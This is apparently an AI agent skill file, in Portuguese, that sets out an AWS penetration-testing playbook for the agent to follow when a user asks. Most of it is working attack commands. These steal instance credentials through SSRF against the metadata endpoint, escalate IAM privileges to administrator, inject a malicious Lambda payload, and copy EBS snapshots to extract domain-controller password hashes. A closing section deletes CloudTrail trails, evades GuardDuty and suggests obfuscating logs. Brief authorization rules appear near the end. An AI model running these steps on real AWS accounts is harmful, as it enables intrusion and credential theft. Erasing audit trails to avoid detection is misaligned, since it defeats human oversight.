---
name: AWS Penetration Testing
description: Esta habilidade deve ser usada quando o usuário pedir para "fazer pentest de AWS", "testar segurança de AWS", "enumerar IAM", "explorar infraestrutura de nuvem", "escalonamento de privilégios em AWS", "testar bucket S3", "SSRF de metadata", "exploração de Lambda", ou precisar de orientação sobre avaliação de segurança de Amazon Web Services.
metadata:
  author: zebbern
  version: "1.1"
---

# AWS Penetration Testing

## Objetivo

Fornecer técnicas abrangentes para penetration testing em ambientes AWS. Abrange enumeração de IAM, escalonamento de privilégios, SSRF para endpoint de metadata, exploração de bucket S3, extração de código Lambda e técnicas de persistência para operações de red team.

## Entradas/Pré-requisitos

- AWS CLI configurado com credenciais
- Credenciais de AWS válidas (mesmo com baixo privilégio)
- Compreensão do modelo de IAM da AWS
- Python 3, biblioteca boto3
- Ferramentas: Pacu, Prowler, ScoutSuite, SkyArk

## Saídas/Entregas

- Caminhos de escalonamento de privilégio de IAM
- Credenciais e segredos extraídos
- Recursos EC2/Lambda/S3 comprometidos
- Mecanismos de persistência
- Constatações de auditoria de segurança

---

## Ferramentas Essenciais

| Ferramenta | Propósito | Instalação |
|------|---------|--------------|
| Pacu | Framework de exploração AWS | `git clone https://github.com/RhinoSecurityLabs/pacu` |
| SkyArk | Descoberta de Shadow Admin | `Import-Module .\SkyArk.ps1` |
| Prowler | Auditoria de segurança | `pip install prowler` |
| ScoutSuite | Auditoria multi-cloud | `pip install scoutsuite` |
| enumerate-iam | Enumeração de permissões | `git clone https://github.com/andresriancho/enumerate-iam` |
| Principal Mapper | Análise de IAM | `pip install principalmapper` |

---

## Fluxo de Trabalho Principal

### Passo 1: Enumeração Inicial

Identifique a identidade comprometida e permissões:

```bash
# Verificar identidade atual
aws sts get-caller-identity

# Configurar profile
aws configure --profile compromised

# Listar chaves de acesso
aws iam list-access-keys

# Enumerar permissões
./enumerate-iam.py --access-key AKIA... --secret-key StF0q...
```

### Passo 2: Enumeração de IAM

```bash
# Listar todos os usuários
aws iam list-users

# Listar grupos do usuário
aws iam list-groups-for-user --user-name TARGET_USER

# Listar políticas anexadas
aws iam list-attached-user-policies --user-name TARGET_USER

# Listar políticas inline
aws iam list-user-policies --user-name TARGET_USER

# Obter detalhes da política
aws iam get-policy --policy-arn POLICY_ARN
aws iam get-policy-version --policy-arn POLICY_ARN --version-id v1

# Listar funções
aws iam list-roles
aws iam list-attached-role-policies --role-name ROLE_NAME
```

### Passo 3: Metadata SSRF (EC2)

Explorar SSRF para acessar endpoint de metadata (IMDSv1):

```bash
# Acessar endpoint de metadata
http://169.254.169.254/latest/meta-data/

# Obter nome da função IAM
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Extrair credenciais temporárias
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME

# Resposta contém:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2019-08-01T05:20:30Z"
}
```

**Para IMDSv2 (token obrigatório):**

```bash
# Obter token primeiro
TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  "http://169.254.169.254/latest/api/token")

# Usar token para requisições
curl -H "X-aws-ec2-metadata-token:$TOKEN" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

**Credenciais de Container Fargate:**

```bash
# Ler ambiente para caminho de credencial
/proc/self/environ
# Procurar por: AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/...

# Acessar credenciais
http://169.254.170.2/v2/credentials/CREDENTIAL-PATH
```

---

## Técnicas de Escalonamento de Privilégio

### Permissões Shadow Admin

Essas permissões são equivalentes a administrador:

| Permissão | Exploração |
|------------|--------------|
| `iam:CreateAccessKey` | Criar chaves para usuário admin |
| `iam:CreateLoginProfile` | Definir senha para qualquer usuário |
| `iam:AttachUserPolicy` | Anexar política admin a si mesmo |
| `iam:PutUserPolicy` | Adicionar política admin inline |
| `iam:AddUserToGroup` | Adicionar a si mesmo ao grupo admin |
| `iam:PassRole` + `ec2:RunInstances` | Lançar EC2 com função admin |
| `lambda:UpdateFunctionCode` | Injetar código em Lambda |

### Criar Chave de Acesso para Outro Usuário

```bash
aws iam create-access-key --user-name target_user
```

### Anexar Política Admin

```bash
aws iam attach-user-policy --user-name my_username \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### Adicionar Política Admin Inline

```bash
aws iam put-user-policy --user-name my_username \
  --policy-name admin_policy \
  --policy-document file://admin-policy.json
```

### Escalonamento de Privilégio em Lambda

```python
# code.py - Injetar em função Lambda
import boto3

def lambda_handler(event, context):
    client = boto3.client('iam')
    response = client.attach_user_policy(
        UserName='my_username',
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
    )
    return response
```

```bash
# Atualizar código Lambda
aws lambda update-function-code --function-name target_function \
  --zip-file fileb://malicious.zip
```

---

## Exploração de Bucket S3

### Descoberta de Bucket

```bash
# Usando bucket_finder
./bucket_finder.rb wordlist.txt
./bucket_finder.rb --download --region us-east-1 wordlist.txt

# Padrões de URL comuns
https://{bucket-name}.s3.amazonaws.com
https://s3.amazonaws.com/{bucket-name}
```

### Enumeração de Bucket

```bash
# Listar buckets (com credenciais)
aws s3 ls

# Listar conteúdo do bucket
aws s3 ls s3://bucket-name --recursive

# Baixar todos os arquivos
aws s3 sync s3://bucket-name ./local-folder
```

### Busca de Bucket Público

```
https://buckets.grayhatwarfare.com/
```

---

## Exploração de Lambda

```bash
# Listar funções Lambda
aws lambda list-functions

# Obter código da função
aws lambda get-function --function-name FUNCTION_NAME
# URL de download fornecida na resposta

# Invocar função
aws lambda invoke --function-name FUNCTION_NAME output.txt
```

---

## Execução de Comandos via SSM

Systems Manager permite execução de comandos em instâncias EC2:

```bash
# Listar instâncias gerenciadas
aws ssm describe-instance-information

# Executar comando
aws ssm send-command --instance-ids "i-0123456789" \
  --document-name "AWS-RunShellScript" \
  --parameters commands="whoami"

# Obter saída do comando
aws ssm list-command-invocations --command-id "CMD-ID" \
  --details --query "CommandInvocations[].CommandPlugins[].Output"
```

---

## Exploração de EC2

### Montar Volume EBS

```bash
# Criar snapshot do volume alvo
aws ec2 create-snapshot --volume-id vol-xxx --description "Audit"

# Criar volume a partir do snapshot
aws ec2 create-volume --snapshot-id snap-xxx --availability-zone us-east-1a

# Anexar à instância do atacante
aws ec2 attach-volume --volume-id vol-xxx --instance-id i-xxx --device /dev/xvdf

# Montar e acessar
sudo mkdir /mnt/stolen
sudo mount /dev/xvdf1 /mnt/stolen
```

### Ataque de Shadow Copy (Windows DC)

```bash
# Técnica CloudCopy
# 1. Criar snapshot do volume do DC
# 2. Compartilhar snapshot com conta do atacante
# 3. Montar em instância do atacante
# 4. Extrair NTDS.dit e SYSTEM
secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local
```

---

## Acesso a Console a partir de Chaves de API

Converter credenciais de CLI para acesso a console:

```bash
git clone https://github.com/NetSPI/aws_consoler
aws_consoler -v -a AKIAXXXXXXXX -s SECRETKEY

# Gera URL de signin para acesso a console
```

---

## Encobrimento de Rastros

### Desabilitar CloudTrail

```bash
# Deletar trail
aws cloudtrail delete-trail --name trail_name

# Desabilitar eventos globais
aws cloudtrail update-trail --name trail_name \
  --no-include-global-service-events

# Desabilitar região específica
aws cloudtrail update-trail --name trail_name \
  --no-include-global-service-events --no-is-multi-region-trail
```

**Nota:** Kali/Parrot/Pentoo Linux dispara alertas de GuardDuty baseado em user-agent. Use Pacu que modifica o user-agent.

---

## Referência Rápida

| Tarefa | Comando |
|------|---------|
| Obter identidade | `aws sts get-caller-identity` |
| Listar usuários | `aws iam list-users` |
| Listar funções | `aws iam list-roles` |
| Listar buckets | `aws s3 ls` |
| Listar EC2 | `aws ec2 describe-instances` |
| Listar Lambda | `aws lambda list-functions` |
| Obter metadata | `curl http://169.254.169.254/latest/meta-data/` |

---

## Restrições

**Obrigatório:**
- Obter autorização escrita antes de testar
- Documentar todas as ações para trilha de auditoria
- Testar apenas recursos dentro do escopo

**Proibido:**
- Modificar dados de produção sem aprovação
- Deixar backdoors persistentes sem documentação
- Desabilitar controles de segurança permanentemente

**Recomendado:**
- Verificar IMDSv2 antes de tentar ataques de metadata
- Enumerar completamente antes de exploração
- Limpar recursos de teste após engagement

---

## Exemplos

### Exemplo 1: SSRF para Admin

```bash
# 1. Encontrar vulnerabilidade SSRF em app web
https://app.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 2. Obter nome da função da resposta
# 3. Extrair credenciais
https://app.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole

# 4. Configurar AWS CLI com credenciais roubadas
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# 5. Verificar acesso
aws sts get-caller-identity
```

---

## Resolução de Problemas

| Problema | Solução |
|-------|----------|
| Access Denied em todos os comandos | Enumerar permissões com enumerate-iam |
| Endpoint de metadata bloqueado | Verificar IMDSv2, tentar metadata de container |
| Alertas de GuardDuty | Usar Pacu com user-agent customizado |
| Credenciais expiradas | Re-buscar de metadata (credenciais temp rodam) |
| CloudTrail registrando ações | Considerar desabilitar ou ofuscar logs |

---

## Recursos Adicionais

Para técnicas avançadas incluindo exploração de Lambda/API Gateway, Secrets Manager & KMS, segurança de container (ECS/EKS/ECR), exploração de RDS/DynamoDB, movimentação lateral de VPC e checklists de segurança, veja [references/advanced-aws-pentesting.md](references/advanced-aws-pentesting.md).